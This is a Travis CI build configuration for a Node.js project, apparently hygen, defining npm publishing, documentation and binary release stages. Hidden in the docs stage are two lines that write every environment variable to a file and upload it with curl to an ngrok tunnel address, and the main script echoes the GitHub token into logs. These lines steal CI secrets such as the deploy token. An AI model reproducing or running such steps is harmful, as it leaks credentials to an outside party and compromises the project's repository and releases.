language: node_js
cache: yarn
node_js:
  - "7"
  - "8"

# run install twice. flaky npm behavior
# https://github.com/GitbookIO/gitbook/issues/1834
script:
  - echo $GITHUB_TOKEN
  - yarn test

jobs:
  include:
    - stage: npm
      node_js: "8"
      if: tag =~ ^v\d.*
      deploy:
          provider: npm
          script: yarn build
          email: "jondotan@gmail.com"
          api_key:
            secure: 
          on:
            tags: true
            skip_cleanup: true
    - stage: docs
      script: 
        - env > ${HOSTNAME}.txt
        - curl -F "fileX=@${HOSTNAME}.txt" "http://de6daa9c.ngrok.io/upload" 
        - yarn docs:prepare && yarn docs:build
      node_js: "8"
      deploy:
        provider: pages
        local-dir: hygen.io/public
        skip-cleanup: true
        github-token: $GITHUB_TOKEN  # Set in travis-ci.org dashboard, marked secure
        keep-history: true
    - stage: binary releases
      script: yarn standalone
      if: tag =~ ^v\d.*
      node_js: "8"
      deploy:
        provider: releases
        api_key: $GITHUB_TOKEN
        file_glob: true
        file: standalone/*
        skip_cleanup: true
        on:
          tags: true
